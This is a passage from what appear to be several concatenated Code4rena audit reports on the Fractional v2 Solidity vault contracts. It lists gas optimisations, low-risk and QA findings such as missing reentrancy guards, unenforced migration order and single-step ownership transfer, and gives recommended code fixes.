https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/references/SupplyReference.sol#L10  ```solidity File: src/references/TransferReference.sol  /// @audit ERC20Transfer(), ERC721TransferFrom(), ERC1155TransferFrom(), ERC1155BatchTransferFrom() 12:   contract TransferReference is ITransfer {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/references/TransferReference.sol#L12  ```solidity File: src/targets/Supply.sol  /// @audit mint(), burn() 11:   contract Supply is ISupply {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/targets/Supply.sol#L11  ```solidity File: src/targets/Transfer.sol  /// @audit ERC20Transfer(), ERC721TransferFrom(), ERC1155TransferFrom(), ERC1155BatchTransferFrom() 13:   contract Transfer is ITransfer {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/targets/Transfer.sol#L13  ```solidity File: src/utils/MerkleBase.sol  /// @audit hashLeafPairs(), verifyProof(), getRoot(), getProof(), log2ceil_naive() 7:    abstract contract MerkleBase {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L7  ```solidity File: src/utils/Metadata.sol  /// @audit setURI() 9:    contract Metadata {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/Metadata.sol#L9  ```solidity File: src/utils/Multicall.sol  /// @audit multicall() 7:    abstract contract Multicall {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/Multicall.sol#L7  ```solidity File: src/utils/SelfPermit.sol  /// @audit selfPermit(), selfPermitAll() 9:    abstract contract SelfPermit {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/SelfPermit.sol#L9  ```solidity File: src/VaultFactory.sol  /// @audit deploy(), getNextAddress(), getNextSeed(), deployFor() 11:   contract VaultFactory is IVaultFactory {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultFactory.sol#L11  ```solidity File: src/VaultRegistry.sol  /// @audit burn(), create(), createFor(), createCollection(), createInCollection(), mint(), totalSupply(), uri(), createCollectionFor() 13:   contract VaultRegistry is IVaultRegistry {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L13  ```solidity File: src/Vault.sol  /// @audit init(), execute(), install(), setMerkleRoot(), uninstall() 11:   contract Vault is IVault, NFTReceiver {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L11  ### [G&#x2011;14]  Using `bool`s for storage incurs overhead ```solidity     // Booleans are more expensive than uint256 or any type that takes up a full     // word because each write operation emits an extra SLOAD to first read the     // slot's contents, replace the bits taken up by the boolean, and then write     // back. This is the compiler's defense against contract upgrades and     // pointer aliasing, and it cannot be disabled. ``` https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27 Use `uint256(1)` and `uint256(2)` for true/false to avoid a Gwarmaccess (**[100 gas](https://gist.github.com/IllIllI000/1b70014db712f8572a72378321250058)**) for the extra SLOAD, and to avoid Gsset (**20000 gas**) when changing from `false` to `true`, after having been `true` in the past  *There is 1 instance of this issue:* ```solidity File: src/FERC1155.sol  23        mapping(address => mapping(address => mapping(uint256 => bool))) 24:           public isApproved;  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L23-L24  ### [G&#x2011;15]  `++i` costs less gas than `i++`, especially when it's used in `for`-loops (`--i`/`i--` too) Saves **5 gas per loop**  *There are 3 instances of this issue:* ```solidity File: src/utils/MerkleBase.sol  188:                  ceil++;  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L188  ```solidity File: src/Vault.sol  78:           for (uint256 i = 0; i < length; i++) {  104:          for (uint256 i = 0; i < length; i++) {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L78  ### [G&#x2011;16]  Using `private` rather than `public` for constants, saves gas If needed, the values can be read from the verified contract source code, or if there are multiple values there can be a single getter function that returns a tuple of the values of all currently-public constants. Saves **3406-3606 gas** in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it's used, and not adding another entry to the method ID table  *There are 5 instances of this issue:* ```solidity File: src/FERC1155.sol  15:       string public constant NAME = "FERC1155";  17:       string public constant VERSION = "1";  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L15  ```solidity File: src/modules/Buyout.sol  35:       uint256 public constant PROPOSAL_PERIOD = 2 days;  37:       uint256 public constant REJECTION_PERIOD = 4 days;  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L35  ```solidity File: src/modules/Migration.sol  43:       uint256 public constant PROPOSAL_PERIOD = 7 days;  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L43  ### [G&#x2011;17]  Division by two should use bit shifting `<x> / 2` is the same as `<x> >> 1`. While the compiler uses the `SHR` opcode to accomplish both, the version that uses division incurs an overhead of [**20 gas**](https://gist.github.com/IllIllI000/ec0e4e6c4f52a6bca158f137a3afd4ff) due to `JUMP`s to and from a compiler utility function that introduces checks which can be avoided by using `unchecked {}` around the division by two  *There are 3 instances of this issue:* ```solidity File: src/utils/MerkleBase.sol  100:                  _node = _node / 2;  136:                  result = new bytes32[](length / 2 + 1);  142:                  result = new bytes32[](length / 2);  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L100  ### [G&#x2011;18]  Empty blocks should be removed or emit something  The code should be refactored such that they no longer exist, or the block should do something useful, such as emitting an event or reverting. If the contract is meant to be extended, the contract should be `abstract` and the function signatures be added without any default implementation. If the block is an empty `if`-statement block to avoid doing subsequent checks in the else-if/else conditions, the else-if/else conditions should be nested under the negation of the if-statement, because they involve different classes of checks, which may lead to the introduction of errors when the code is later modified (`if(x){}else if(y){...}else{...}` => `if(!x){if(y){...}else{...}}`). Empty `receive()`/`fallback() payable` functions that are not used, can be removed to save deployment gas.  *There are 3 instances of this issue:* ```solidity File: src/modules/Buyout.sol  53:       receive() external payable {}  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L53  ```solidity File: src/modules/Migration.sol  63:       receive() external payable {}  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L63  ```solidity File: src/Vault.sol  32:       receive() external payable {}  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L32  ### [G&#x2011;19]  Use custom errors rather than `revert()`/`require()` strings to save gas Custom errors are available from solidity version 0.8.4. Custom errors save [**~50 gas**](https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746) each time they're hit by [avoiding having to allocate and store the revert string](https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth). Not defining the strings also save deployment gas  *There are 5 instances of this issue:* ```solidity File: src/FERC1155.sol  263           require( 264               msg.sender == _from || 265                   isApprovedForAll[_from][msg.sender] || 266                   isApproved[_from][msg.sender][_id], 267               "NOT_AUTHORIZED" 268:          );  275           require( 276               _to.code.length == 0 277                   ? _to != address(0) 278                   : INFTReceiver(_to).onERC1155Received( 279                       msg.sender, 280                       _from, 281                       _id, 282                       _amount, 283                       _data 284                   ) == INFTReceiver.onERC1155Received.selector, 285               "UNSAFE_RECIPIENT" 286:          );  297:          require(metadata[_id] != address(0), "NO METADATA");  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L263-L268  ```solidity File: src/utils/MerkleBase.sol  62:           require(_data.length > 1, "wont generate root for single leaf");  78:           require(_data.length > 1, "wont generate proof for single leaf");  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L62  ### [G&#x2011;20]  Functions guaranteed to revert when called by normal users can be marked `payable` If a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are  `CALLVALUE`(2),`DUP1`(3),`ISZERO`(3),`PUSH2`(3),`JUMPI`(10),`PUSH1`(3),`DUP1`(3),`REVERT`(0),`JUMPDEST`(1),`POP`(2), which costs an average of about **21 gas per call** to the function, in addition to the extra deployment cost  *There are 6 instances of this issue:* ```solidity File: src/FERC1155.sol  56        function burn( 57            address _from, 58            uint256 _id, 59            uint256 _amount 60:       ) external onlyRegistry {  79        function mint( 80            address _to, 81            uint256 _id, 82            uint256 _amount, 83            bytes memory _data 84:       ) external onlyRegistry {  198:      function setContractURI(string calldata _uri) external onlyController {  205       function setMetadata(address _metadata, uint256 _id) 206           external 207:          onlyController  217       function setRoyalties( 218           uint256 _id, 219           address _receiver, 220           uint256 _percentage 221:      ) external onlyController {  229       function transferController(address _newController) 230           external 231:          onlyController  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L56-L60  
## Low  ### Prefer two step ownership transfers  Vault owners may transfer ownership of a vault contract in a single step by calling `transferOwnership`:  [`Vault#transferOwnership`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L93-L97)  ```solidity     function transferOwnership(address _newOwner) external {         if (owner != msg.sender) revert NotOwner(owner, msg.sender);         owner = _newOwner;         emit TransferOwnership(msg.sender, _newOwner);     } ```  Similarly, the `FERC1155` controller may be transferred in a single step:  [`FERC1155#transferController`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L228-L236)  ```solidity      function transferController(address _newController)         external         onlyController     {         if (_newController == address(0)) revert ZeroAddress();         _controller = _newController;         emit ControllerTransferred(_newController);     } ```  If the owner/controller is accidentally transferred to an incorrect address, ownership of these contracts may be permanently lost.  Consider introducing a mechanism for two-step ownership transfers.  ### Missing array length validations  [`Vault#install`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L73-L82) assumes that the `_selectors` and `_plugins` arrays are of equal length, but does not validate that they are equal.  ```solidity     function install(bytes4[] memory _selectors, address[] memory _plugins)         external     {         if (owner != msg.sender) revert NotOwner(owner, msg.sender);         uint256 length = _selectors.length;         for (uint256 i = 0; i < length; i++) {             methods[_selectors[i]] = _plugins[i];         }         emit InstallPlugin(_selectors, _plugins);     } ```  Unlike batch token transfers, there is a more limited impact here—in the worst case, the user can call this function again to add the accidentally omitted plugin.   ### Gas reserve cannot be increased  Vaults define a `MIN_GAS_RESERVE` constant used to calculate the gas stipend used in [`Vault#_execute`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L128). If future gas costs increase, this stipend may be insufficient. Consider allowing the contract owner to increase the value of this parameter.  ## Informational  ## Solidity optimizer bugs in versions 0.8.13 and 0.8.14  Solidity versions 0.8.13 and 0.8.14 are vulnerable to an [optimizer bug](https://blog.soliditylang.org/2022/06/15/inline-assembly-memory-side-effects-bug/) related to inline assembly. Solidity 0.8.15 has been released with a fix.  This bug only occurs under very specific conditions: the legacy optimizer must be enabled rather than the IR pipeline (true for this project's current project configuration), and the affected assembly blocks must not refer to any local Solidity variables. Inline assembly used here, in Solmate, and in OpenZeppelin does not appear vulnerable. However, it's worth being aware of this vulnerability. Consider upgrading to Solidity 0.8.15.  ## QA  Your project `README` is a great high level intro to the core concepts in Fractional V2, but I'd encourage you to expand on this documentation. Including some worked examples of how components are intended to fit together would be really helpful, especially since Fractional intends to be an open, extensible hyperstructure.  I think it would be especially helpful to clarify how protocol components fit together in two broad scenarios: 1) "normal" users creating new vaults through the Fractional UI and 2) "power" users configuring vaults at a low level and creating new modules to extend the protocol.  For example, I was quite surprised to see that a vault owner can execute arbitrary calls that might bypass modules until I understood that vaults are not usually configured with EOA owners. This wasn't clear from reading the docs and my mental model of the protocol was wrong.  There are some very cool patterns in place in this codebase that others may want to adopt or build on!  ### Use `address.code.length`  [`Vault#_execute`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L119-L124) uses inline assembly to check that the target is a valid contract:  ```solidity         // Check that the target is a valid contract         uint256 codeSize;         assembly {             codeSize := extcodesize(_target)         }         if (codeSize == 0) revert TargetInvalid(_target); ```  In Solidity version `0.8.1` and later, `address.code.length` can be used to access code size. this is equivalent to the assembly version above, but more concise.  Suggestion:  ```solidity         if (_target.code.length == 0) revert TargetInvalid(_target); ```  ### Missing events A number of state changing functions do not emit corresponding events. Consider emitting events from these functions.  - [`Migration#propose`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L72) - [`Migration#join`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L105) - [`Migration#leave`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L141) - [`Migration#commit`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L179) - [`Migration#withdrawContribution`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L292) - [`FERC1155#royaltyInfo`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L241)  ### Misnamed constants  There are a handful of typos, misnamings, and inconsistencies in the constants used for functions implemented in assembly.  [`Transfer#ERC1155_SAFE_TRANSFER_FROM_signature`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/constants/Transfer.sol#L51-L53) has a trailing lowercase word, unlike other constants.  ```solidity uint256 constant ERC1155_SAFE_TRANSFER_FROM_signature = (     0xf242432a00000000000000000000000000000000000000000000000000000000 ); ```  The [`Transfer#TOKEN_TRANSFER_GENERTIC_`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/constants/Transfer.sol#L120-L129) constants should be `TOKEN_TRANSFER_GENERIC`.  ```solidity uint256 constant TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_SIGNATURE = (     0xf486bc8700000000000000000000000000000000000000000000000000000000 ); uint256 constant TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_SIG_PTR = 0x00; uint256 constant TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_TOKEN_PTR = 0x04; uint256 constant TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_FROM_PTR = 0x24; uint256 constant TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_TO_PTR = 0x44; uint256 constant TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_ID_PTR = 0x64; uint256 constant TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_AMOUNT_PTR = 0x84; uint256 constant TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_LENGTH = 0xa4; // 4 + 32 * 5 == 164 ```  Finally, [`Memory#EIGHT_BYTES`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/constants/Memory.sol#L18-L19) is actually `FOUR_BYTES`.  ```solidity uint256 constant EIGHT_BYTES = 0x04; ```  This is pretty confusing when used in [`Transfer#ERC1155BatchTransferFrom`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/targets/Transfer.sol#L474-L491), since the implementation is correct, but the offsets appear to be wrong:  ```solidity     function ERC1155BatchTransferFrom(         address, /*_token*/         address, /*_from*/         address, /*_to*/         uint256[] calldata, /*_ids*/         uint256[] calldata /*_amounts*/     ) external {         // Utilize assembly to perform an optimized ERC1155 batch transfer.         assembly {             // Write the function selector             // safeBatchTransferFrom(address,address,uint256[],uint256[],bytes)             mstore(                 ERC1155_BATCH_TRANSFER_FROM_OFFSET,                 ERC1155_SAFE_BATCH_TRANSFER_FROM_SIGNATURE             )              // Retrieve the token from calldata.             let token := calldataload(EIGHT_BYTES)              // If the token has no code, revert.             if iszero(extcodesize(token)) {                 mstore(NO_CONTRACT_ERROR_SIG_PTR, NO_CONTRACT_ERROR_SIGNATURE)                 mstore(NO_CONTRACT_ERROR_TOKEN_PTR, token)                 revert(NO_CONTRACT_ERROR_SIG_PTR, NO_CONTRACT_ERROR_LENGTH)             }              // Get the total number of supplied ids.             let idsLength := calldataload(                 add(EIGHT_BYTES, ERC1155_BATCH_TRANSFER_IDS_LENGTH_OFFSET)             )               // Rest of function omitted here...     } ```  ### Incorrect comments  The transfer in [`Buyout.sol#withdrawERC20`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L333-L334) is an ERC20 transfer, not an ERC721:  ```solidity         // Executes transfer of ERC721 token to caller         IVault(payable(_vault)).execute(transfer, data, _erc20TransferProof); ```  ### Unused imports - `IERC20` in [`Migration.sol`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L5)
# 1. Code Summary  #### Code Quality and Test Coverage  In summary, the code quality of the Fractional was found to be high. The codes were also found to be well-documented and the team took the efforts to document the NatSpec for all the functions within the contracts. As a result, it is easy for the reader to understand the overall architecture and design of the system. However, some minor errors within the comments were observed. Although it does not cause any technical issues or result in a loss of fund, it is recommended for the team to review them and update them accordingly to ensure that the documentation reflects what the system does accurately.  Further improvement to the code readability can be made by using a modifier, refer to the "Use modifier for better readability and code reuse" below. Another key concern that is the functions within the `Supply` and `Transfer` contracts are implemented entirely in assembly. Even though assembly code was used for gas optimization, it reduces the readability (and future updatability) of the code. Consider eliminating all assembly code and re-implement them in Solidity to make the code significantly more clean.  Test coverage was found to be high. All the key features were found to be covered in the test.  # 2. Key Risks & Improvement Opportunities  #### Excessive Power Holds By Vault Owner  Fractional allows vault owners to install custom plugins to extend the functionality of the vault during or after deployment. The plugins within the vault could theoretically perform any task such as transferring the asset from the vault to an arbitrary wallet address or minting any amount of new fractional tokens. Therefore, it is critical for the fractional token holders of a vault to be aware of this risk and the token holders must ensure that the vault owner is trustworthy.  Under normal circumstances, the vault owner will be Fractional's `VaultRegistry` contract, which does not pose much of an issue because `VaultRegistry` contract is considered a trusted entity within Fractional protocol. However, potential fractional token investors should take note that some vaults can be created via `VaultRegistry.createFor`, which will transfer the ownership of the vault to an arbitrary address. In such a case, potential investors must ensure that the new vault owner is trustworthy enough not to perform a rug pull or steal the assets in the vault.  Consider documenting this risk if needed so that potential fractional token holders can make an informed decision.  #### Conflicting Module Might Block Functionality Of Another Module  Both the `Buyout` and `Migration` modules depend heavily on the state of the vault (e.g. INACTIVE, LIVE, SUCCESS) to determine if a function can be executed at any point in time. For instance, a buyout can only be started only if the vault state is "INACTIVE", or a migration can only be settled if the vault state is "SUCCESS".  A module changing the vault state might cause unintended behavior in another module. For instance, when a buyer starts an auction within the `Buyout` module, it will cause the vault state to change to `State.LIVE`. As a result, it will cause contributors of a proposal within the `Migration` module to be unable to withdraw their contributed assets from the proposal because the `Migration.withdrawContribution` function requires the vault state to be `State.INACTIVE`. Thus, contributor assets are stuck in the `Migration` contract whenever a buyer starts an auction in the `Buyout` module.  It is recommended to take extra caution when writing the module to ensure that it does not accidentally block the functionality of another module.  #### Step In A Process Can Be Bypassed Or Triggered In An Out-of-Order Manner  To ensure that the vault operates in an expected manner, it is important that the contracts prevent users from calling functions in an out-of-order manner or bypassing certain step in a process. It was observed that it is possible for users to call the function in an out-of-order manner or bypass certain step in a process entirely. Following illustrates some of the examples:   - A user can call `Migration.settleVault ` follow by `Migration.migrateFractions `, thus skipping the `Migration.settleFractions` - A contributor should call `Migration.leave` to leave a proposed migration to get back their asset if the proposal has not been committed yet. However, instead of calling `Migration.leave`, the contributor can choose to call `Migration.withdrawContribution` which will succeed without any revert.  Ensure that the sequence in a process (e.g. buyout or migration process) is strictly followed and enforced.  #### Re-entrancy Risks  The key features of the protocols were found to be following the "Checks Effects Interactions" pattern rigorously, which helps to prevent any possible re-entrancy attack. So far no re-entrancy attack that can lead to loss of asset was observed during the contest. However, further improvements can be made to guard against future re-entrancy attacks in case any attack vector is missed out by C4's wardens during the contest.   A number of key functions within `Buyout` and `Migration` modules deal with ERC1155, which contains a hook that will make a callback to the recipient whenever a transfer occurs, thus increasing the risk of a re-entrancy attack. Refer to the "Lack Of Reentrancy Guards" issue for more details.  Thus, it would be prudent to implement additional reentrancy prevention wherever possible by utilizing the `nonReentrant` modifier from [Openzeppelin Library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol) to block possible re-entrancy as a defense-in-depth measure.  #### Input Validation  Although input validation has been already implemented in the majority of the functions, it can be further strengthened to thwart potential attacks or prevent unexpected behavior in the future. For instance, `Vault.transferOwnership` does not check if the ownership is being transferred to `address(0)`, which might affect the functionality of the vault.  # 3. Summary Of Findings  The following is a summary of the low and non-critical findings observed during the contest.  | No.  | Title                                                        | Risk Rating  | | ---- | ------------------------------------------------------------ | ------------ | | 4.1  | Lack Of Reentrancy Guards                                    | Low          | | 4.2  | Migration Sequence Not Enforced                              | Low          | | 4.3  | State Variable Visibility Is Not Set                         | Low          | | 4.4  | Risk of Plugins                                              | Low          | | 4.5  | Ether Might Stuck In `Vault.sol`                             | Low          | | 4.6  | Ownership May Be Burned                                      | Low          | | 4.7  | Array Length Not Validated                                   | Low          | | 4.8  | Consider Two-Phase Ownership Transfer                        | Low          | | 4.9  | Migration Proposer Can Hijack Other User's Buyout To Settle A Vault | Low          | | 5.1  | Incorrect Comment                                            | Non-Critical | | 5.2  | Use Modifier For Better Readability And Code Reuse           | Non-Critical | | 5.3  | Assembly Within `Supply.sol` and `Transfer.sol`              | Non-Critical | | 5.4  | Variable Should Be Called `isInit` Instead Of `Nonce`        | Non-Critical |    # 4. Low Risk Issues  ## 4.1   Lack Of Reentrancy Guards  #### Description  Whenever `IERC1155(token).safeTransferFrom` is called, the `to` address can re-enter back to the contracts due to the `ERC1155TokenReceiver(to).onERC1155Received(msg.sender, from, id, amount, data)` code (hook)  https://github.com/Rari-Capital/solmate/blob/03e425421b24c4f75e4a3209b019b367847b7708/src/tokens/ERC1155.sol#L55  ```solidity function safeTransferFrom(     address from,     address to,     uint256 id,     uint256 amount,     bytes calldata data ) public virtual {     require(msg.sender == from || isApprovedForAll[from][msg.sender], "NOT_AUTHORIZED");      balanceOf[from][id] -= amount;     balanceOf[to][id] += amount;      emit TransferSingle(msg.sender, from, to, id, amount);      require(         to.code.length == 0             ? to != address(0)             : ERC1155TokenReceiver(to).onERC1155Received(msg.sender, from, id, amount, data) ==                 ERC1155TokenReceiver.onERC1155Received.selector,         "UNSAFE_RECIPIENT"     ); } ```  The following functions utilise `IERC1155(token).safeTransferFrom` that allows the caller or proposer to re-enter back to the contracts  - [`Buyout.buyFractions`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L149)  - [`Buyout.end`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L184)  - [`Migration.leave`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L141)  - [`Migration.withdrawContribution`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L292)  #### Recommendation  Apply necessary reentrancy prevention by utilizing the OpenZeppelin's nonReentrant modifier to block possible re-entrancy.    ## 4.2 Migration Sequence Not Enforced  #### Description  Functions should be called in the following sequence to migrate a vault after a successful buyout.  1. `Migration.settleVault` - Create new vault  2. `Migration.settleFractions` - Mint new fractional tokens to new vault  3. `Migration.migrateFractions` - Give investors the new fractional token  However, a user can call `Migration.settleVault ` follow by `Migration.migrateFractions `, thus skipping the `Migration.settleFractions`.  Although it does not result in any loss of asset, allowing users to call the functions pertaining to migration in an out-of-order manner might cause unintended consequence in the future.  #### Recommendation  After the `Migration.settleFractions` has been executed, the `migrationInfo[_vault][_proposalId].fractionsMigrated` will be set to `true`.  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L257  ```solidity function settleFractions(     address _vault,     uint256 _proposalId,     bytes32[] calldata _mintProof ) external {     ..SNIP..     migrationInfo[_vault][_proposalId].fractionsMigrated = true; } ```  Within the `Migration.migrateFractions` function, check that `migrationInfo[_vault][_proposalId].fractionsMigrated == true` to ensure that the `Migration.settleFractions` has been executed.  ```diff function migrateFractions(address _vault, uint256 _proposalId) external { + // Fractional tokens must be minted first before migrating + require(migrationInfo[_vault][_proposalId].fractionsMigrated, "Fractional token not minted yet");     // Reverts if address is not a registered vault     (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);     if (id == 0) revert NotVault(_vault);     // Reverts if buyout state is not successful     (, address proposer, State current, , , ) = IBuyout(buyout).buyoutInfo(         _vault     );     State required = State.SUCCESS;     if (current != required) revert IBuyout.InvalidState(required, current);     // Reverts if proposer of buyout is not this contract     if (proposer != address(this)) revert NotProposalBuyout(); ```    ## 4.3 State Variable Visibility Is Not Set  #### Description  Visibility is not set for the `token` state variable.  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/Metadata.sol#L13  ```solidity /// @title Metadata /// @author Fractional Art /// @notice Utility contract for storing metadata of an FERC1155 token contract Metadata {     /// @notice Address of FERC1155 token contract     address immutable token; ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/references/SupplyReference.sol#L12  ```solidity /// @title Supply /// @author Fractional Art /// @notice Reference implementation for the optimized Supply target contract contract SupplyReference is ISupply {     /// @notice Address of VaultRegistry contract     address immutable registry; ```  #### Recommendation  It is best practice to set the visibility of state variables explicitly. The default visibility for "token" is internal. Other possible visibility settings are public and private.    ## 4.4 Risk of Plugins  #### Description  All plugins' functions within the vault can be called by any public user. If the plugins contain any unprotected privileged functions, it can be called by malicious user.  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L38  ```solidity /// @dev Callback for handling plugin transactions /// @param _data Transaction data /// @return response Return data from executing plugin // prettier-ignore fallback(bytes calldata _data) external payable returns (bytes memory response) {     address plugin = methods[msg.sig]; // @audit-issue what if we have the diff contract with same function name? Collision?     (,response) = _execute(plugin, _data); } ```  #### Recommendation  Include a warning in the comments or documentation so that the vault owner is aware that any plugin's function added can be called by the public users. Vault owners should ensure that plugin's functions have the necessary access control in place so that only authorised users can trigger the functions.    ## 4.5 Ether Might Stuck In `Vault.sol`  #### Description  If a user accidentally sent ether to the `Vault` contract, the ether will be stuck in the vault with no way to retrieve them.  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L32  ```solidity /// @dev Callback for receiving Ether when the calldata is empty receive() external payable {} ```  #### Recommendation  Consider if there is a need for the `Vault` contract to receive ethers. Otherwise, remove it.    ## 4.6 Ownership May Be Burned  #### Description  It was observed that the vault owner can transfer the ownership to `address(0)`, which effectively burn the ownership.  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L93  ```solidity /// @notice Transfers ownership to given account /// @param _newOwner Address of new owner function transferOwnership(address _newOwner) external {     if (owner != msg.sender) revert NotOwner(owner, msg.sender);     owner = _newOwner;     emit TransferOwnership(msg.sender, _newOwner); } ```  #### Recommendation  It is recommended to implement a validation check to ensure that the ownership is not transferred to `address(0)`.  ```diff function transferOwnership(address _newOwner) external {     if (owner != msg.sender) revert NotOwner(owner, msg.sender); +   require(_newOwner != 0, "Invalid new owner: address(0)");     owner = _newOwner;     emit TransferOwnership(msg.sender, _newOwner); } ```    ## 4.7 Array Length Not Validated  #### Description  The `Vault.install` function did not validate that the length of `_selectors` and `_plugins` arrays is the same. If the array length is different, it might cause unexpected behavior.  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L73  ```solidity /// @notice Installs plugin by setting function selector to contract address /// @param _selectors List of function selectors /// @param _plugins Addresses of plugin 